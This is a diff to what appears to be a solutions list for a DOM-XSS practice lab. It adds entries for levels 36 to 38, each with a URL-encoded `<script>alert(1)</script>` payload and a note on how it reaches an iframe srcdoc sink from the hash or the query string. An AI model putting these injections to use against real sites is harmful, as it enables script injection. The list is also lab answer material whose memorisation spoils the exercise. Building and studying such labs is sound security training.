@@ -246,3 +246,24 @@ Client-side DOM sinks driven by URL, hash, query, name, referrer, postMessage.
 
 - payload: `<img src=x onerror=alert(1)>`
 - context: hash split by `,` joined with ''; payload has no commas so passes through to innerHTML
+
+### dom-level36
+
+`/dom/level36/#%3Cscript%3Ealert(1)%3C/script%3E`
+
+- payload: `<script>alert(1)</script>` (in the URL fragment)
+- context: `iframe.srcdoc = decodeURIComponent(location.hash)` — srcdoc is a full document, so an inline `<script>` actually runs (no `onerror` needed)
+
+### dom-level37
+
+`/dom/level37/?query=%3Cscript%3Ealert(1)%3C/script%3E`
+
+- payload: `<script>alert(1)</script>`
+- context: `iframe.srcdoc = query` — query-param source into the srcdoc property
+
+### dom-level38
+
+`/dom/level38/?query=%3Cscript%3Ealert(1)%3C/script%3E`
+
+- payload: `<script>alert(1)</script>`
+- context: `iframe.setAttribute('srcdoc', query)` — the setAttribute path to the same sink
